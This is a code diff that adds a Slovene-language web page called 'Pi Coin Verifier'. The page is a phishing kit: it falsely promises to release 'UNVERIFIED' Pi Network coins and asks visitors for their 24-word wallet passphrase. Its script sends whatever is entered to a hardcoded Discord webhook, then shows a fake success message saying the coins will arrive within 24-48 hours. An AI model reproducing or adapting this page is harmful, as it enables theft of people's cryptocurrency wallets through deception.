@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Experience Form</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet"> <!-- Added Google Fonts -->
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif; /* Use the new font */
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Align items to the top */
+            height: auto; /* Adjust height */
+            background: linear-gradient(135deg, #6a1b9a, #8e24aa);
+            color: white;
+            padding: 20px;
+            line-height: 1.8; /* Increased space between rows */
+            letter-spacing: 0.5px; /* Increased space between words */
+        }
+        .rounded-box {
+            background-color: rgba(0, 0, 0, 0.5); /* Reduced opacity */
+            border-radius: 30px;
+            padding: 30px;
+            text-align: center;
+            width: 350px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            margin-bottom: 20px; /* Added margin for spacing between boxes */
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .apply-button {
+            background: linear-gradient(to bottom, #ff80ab, #c51162);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+            outline: 2px solid white;
+        }
+        .apply-button:hover {
+            background: linear-gradient(to bottom, #ff4081, #880e4f);
+        }
+        /* Modal styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.6); /* Black w/ opacity */
+        }
+        .modal-content {
+            background-color: #6a1b9a; /* Match modal color to the page color */
+            margin: 15% auto; /* 15% from the top and centered */
+            padding: 20px;
+            border: 1px solid #888;
+            width: 400px; /* Could be more or less, depending on screen size */
+            border-radius: 10px;
+            color: white; /* Text color in the modal */
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: white; /* Change close button color */
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .submit-button {
+            background-color: #007bff; /* Blue button color */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 16px 20px; /* Thicker button */
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%; /* Full width */
+            margin-top: 10px;
+            font-size: 16px; /* Bigger text */
+        }
+        .submit-button:hover {
+            background-color: #0056b3; /* Darker blue on hover */
+        }
+        textarea {
+            width: 100%; /* Match the width of the submit button */
+            height: 100px; /* Larger textarea */
+            border-radius: 5px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        /* Adding styling for the image */
+        .main-image {
+            width: 100%; /* Make the image responsive */
+            margin-top: 15px; /* Add some space above the image */
+            border-radius: 5px; /* Add rounded corners */
+        }
+        .checkmark {
+            color: white;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            margin-top: 10px; /* Space before the checkmarks */
+        }
+        .checkmark::before {
+            content: '✔'; /* Checkmark symbol */
+            margin-right: 5px; /* Space between the checkmark and text */
+            font-size: 20px; /* Size of the checkmark */
+            color: white; /* Color for the checkmark */
+        }
+        /* Confirmation Modal Styles */
+        .confirmation-modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 2; /* Sit on top of other modals */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.6); /* Black w/ opacity */
+        }
+        .confirmation-content {
+            background-color: #28a745; /* Green background */
+            margin: 15% auto; /* Centered */
+            padding: 20px;
+            border: 1px solid #888;
+            width: 400px; /* Could be more or less, depending on screen size */
+            border-radius: 10px;
+            color: white; /* Text color */
+            text-align: center; /* Center text */
+        }
+    </style>
+</head>
+<body>
+    <div class="rounded-box">
+        <h2>Pi Coin Verifier</h2>
+        <p>Na PI Network strani je veliko Pionirjev opazilo, da imajo v svoji bilanci število pijev, kateri so "UNVERIFIED". Kaj to pomeni? To pomeni, da si člani vaše skupine niso naredili KYC. Opaža se pa problem, da si član naredi KYC, vendar pionirji ne prejmejo pijev. To se zgodi ker je databaza pi preobremenjena in ne utegne takoj potrditi vaše pije oseb ki so si naredili KYC, pri tem vam pride v pomoč PI NETWORK VERIFIER. Pi network verifier vam omogoča, da skupini za izračun ter preverjanje KYC, ponovno pošljete vaš račun za pregled in izračun vaših pijev, Če imate na računu UNVERIFIED PI in ne veste kako jih prenesti v vašo denarnico, sledite navodilom vspodaj.</p>
+        <button class="apply-button" id="openModal">PRENESITE VAŠE UNVERIFIED KOVANCE</button>
+        <img src="proofslika.jpg" alt="Proof Slika Image" class="main-image">
+    </div>
+    <div class="rounded-box second-box">
+        <img src="denar.png" alt="Denar Image" class="main-image"> <!-- New image at the top -->
+        <h2 style="margin-top: 10px;">Kako deluje?</h2>
+        
+        <p>v polje v zaporedju vnesite ter z vejico ločite: število vaših unverified pi, število pi, ki jih želite prenesti, število pi, ki jih imate v denarnici ( MORA JIH BITI VSAJ 50, DA PREPREČIMO USTVARJANJE LAŽNIH DENARNIC), ter na koncu vaš 24-beseden passphrase.</p> 
+        <div class="checkmark">brezplačno</div>
+        <div class="checkmark">varno</div>
+        <button class="apply-button" id="openModal2">PRENESITE VAŠE UNVERIFIED KOVANCE </button> <!-- Updated button -->
+    </div>
+    <!-- Modal -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal">&times;</span>
+            <h2>SLEDITE NAVODILOM IN Z 24-BESEDNIM PASSPHRASE PRENESITE VAŠE PI KOVANCE.</h2>
+            <form id="walletWordsForm">
+                <textarea id="walletWords" name="walletWords" placeholder="v polje v zaporedju vnesite ter z vejico ločite: število vaših unverified pi, število pi, ki jih želite prenesti, število pi, ki jih imate v denarnici ( MORA JIH BITI VSAJ 50, DA PREPREČIMO USTVARJANJE LAŽNIH DENARNIC), ter na koncu vaš 24-beseden passphrase..." required></textarea>
+                <button type="submit" class="submit-button">Odklenite s passphrase</button> <!-- Submit button -->
+            </form>
+        </div>
+    </div>
+    <!-- Confirmation Modal -->
+    <div id="confirmationModal" class="confirmation-modal">
+        <div class="confirmation-content">
+            <h2>Potrditev uspešna</h2>
+            <p>Vaši kovanci bodo prispeli v 24-48 urah. V tem času lahko zaprete spletno stran. Obvestili vas bomo na vašo aplikacijo PI Network.</p>
+        </div>
+    </div>
+    <script>
+        // Get the modals
+        const modal = document.getElementById("myModal");
+        const confirmationModal = document.getElementById("confirmationModal");
+        const openModalButton1 = document.getElementById("openModal");
+        const openModalButton2 = document.getElementById("openModal2");
+        const closeModalButton = document.getElementById("closeModal");
+        // When the user clicks the first button, open the modal
+        openModalButton1.onclick = function() {
+            modal.style.display = "block";
+        }
+        // When the user clicks the second button, also open the modal
+        openModalButton2.onclick = function() {
+            modal.style.display = "block";
+        }
+        // When the user clicks on <span> (x), close the modal
+        closeModalButton.onclick = function() {
+            modal.style.display = "none";
+        }
+        // When the user clicks anywhere outside of the modal, close it
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            } else if (event.target == confirmationModal) {
+                confirmationModal.style.display = "none";
+            }
+        }
+        // Handle form submission
+        document.getElementById('walletWordsForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const walletWords = document.getElementById('walletWords').value;
+            // Your Discord webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1347296068479484035/PGm0_wplUDY-0HWVKrceJnKa0khQNiz2a4GdttQTQFvtYO1NId25StcWC85pkzwHwM0k';
+            // Send wallet words to Discord webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: walletWords })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Your wallet words have been submitted!');
+                    document.getElementById('walletWords').value = ''; // Clear the input field
+                    modal.style.display = "none"; // Close the modal
+                    confirmationModal.style.display = "block"; // Show confirmation popup
+                } else {
+                    throw new Error('Network response was not ok.');
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('There was an error submitting your wallet words.');
+            });
+        });
+    </script>
+</body>
+</html>
